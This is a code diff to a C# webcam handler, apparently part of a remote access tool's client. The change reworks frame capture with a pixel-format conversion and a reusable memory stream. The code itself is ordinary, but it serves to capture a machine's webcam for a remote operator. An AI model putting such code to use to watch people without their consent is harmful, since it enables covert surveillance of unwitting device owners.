@@ -14,7 +14,7 @@ using Pulsar.Common.Messages.Other;
 using System.Collections.Concurrent;
 
 namespace Pulsar.Client.Messages
-{
+{    
     public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
     {
         private UnsafeStreamCodec _streamCodec;
@@ -38,6 +38,8 @@ namespace Pulsar.Client.Messages
         private int _frameCount = 0;
         private float _lastFrameRate = 0f;
         private bool _sendFrameRateNext = false;
+
+        private MemoryStream _reusableStream = new MemoryStream();
 
         public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                              message is GetAvailableWebcams;
@@ -279,8 +281,8 @@ namespace Pulsar.Client.Messages
             }
 
             Debug.WriteLine("Buffered capture loop ended");
-        }
-
+        }        
+        
         private byte[] CaptureFrame()
         {
             try
@@ -292,19 +294,41 @@ namespace Pulsar.Client.Messages
                     return null;
                 }
 
-                _webcamData = _webcam.LockBits(new Rectangle(0, 0, _webcam.Width, _webcam.Height),
-                    ImageLockMode.ReadWrite, _webcam.PixelFormat);
-
-                using (MemoryStream stream = new MemoryStream())
+                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
+                Bitmap processedBitmap = _webcam;
+                
+                if (_webcam.PixelFormat != codecPixelFormat)
                 {
-                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                    _streamCodec.CodeImage(_webcamData.Scan0,
-                        new Rectangle(0, 0, _webcam.Width, _webcam.Height),
-                        new Size(_webcam.Width, _webcam.Height),
-                        _webcam.PixelFormat, stream);
-
-                    return stream.ToArray();
+                    try
+                    {
+                        processedBitmap = new Bitmap(_webcam.Width, _webcam.Height, codecPixelFormat);
+                        using (Graphics g = Graphics.FromImage(processedBitmap))
+                        {
+                            g.DrawImage(_webcam, 0, 0, _webcam.Width, _webcam.Height);
+                        }
+                        _webcam.Dispose();
+                        _webcam = processedBitmap;
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
+                        processedBitmap = _webcam;
+                    }
                 }
+
+                _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
+
+                _reusableStream.Position = 0;
+                _reusableStream.SetLength(0);
+
+                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
+                _streamCodec.CodeImage(_webcamData.Scan0,
+                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    new Size(processedBitmap.Width, processedBitmap.Height),
+                    processedBitmap.PixelFormat, _reusableStream);
+
+                return _reusableStream.ToArray();
             }
             catch (Exception ex)
             {
@@ -370,8 +394,8 @@ namespace Pulsar.Client.Messages
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-        }
-
+        }        
+        
         protected virtual void Dispose(bool disposing)
         {
             if (disposing)
@@ -380,6 +404,7 @@ namespace Pulsar.Client.Messages
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
                 _frameRequestEvent?.Dispose();
+                _reusableStream?.Dispose();
             }
         }
     }
